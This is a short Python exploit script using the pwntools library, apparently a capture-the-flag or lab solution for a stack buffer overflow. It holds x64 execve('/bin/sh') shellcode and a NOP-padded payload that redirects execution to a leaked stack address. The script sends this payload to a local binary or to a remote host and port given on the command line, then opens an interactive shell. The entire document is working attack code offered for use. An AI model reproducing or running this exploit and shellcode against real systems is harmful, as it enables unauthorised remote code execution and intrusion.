from pwn import *

# Linux/x64 - execve(/bin/sh) Shellcode (23 bytes)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# (0x50 byte 2 overFlow);
# 8(NOPs) + 23(shellcode) + 80-(23-8)(NOPs) + 8(NOPs`RBP`) + 8(leak_addr)
PAYLOAD =  b"\x90" * 8
PAYLOAD += shellcode
PAYLOAD += b"\x90" * (80 - len(PAYLOAD))
PAYLOAD += b"\x90" * 8

def exploit_l(file: str):
    p = process(file)
    leak_addr = p.recv().splitlines()[-1].split()[-1].decode("UTF-8")
    info("Leak address: " + leak_addr)
    p.sendline(PAYLOAD + p64(int(leak_addr, 16)))
    p.interactive()

def exploit_r(host_port: list):
    HOST, PORT = host_port[0], host_port[1]
    c = remote(HOST, int(PORT))
    c.recv()
    leak_addr = c.recv().splitlines()[-1].split()[-1].decode("UTF-8")
    info("Leak address: " + leak_addr)
    c.sendline(PAYLOAD + p64(int(leak_addr, 16)))

    c.interactive()

def main():
    import sys
    try:
        content: str = sys.argv[2]
        if sys.argv[1] == "-l": exploit_l(content)
        if sys.argv[1] == "-r": exploit_r(content.split(":"))
    except:
        print("python exploit.py -l file.out        : for locally  exploit")
        print("python exploit.py -r HOST:PORT       : for remotely exploit!")

if __name__ == "__main__":
    main()
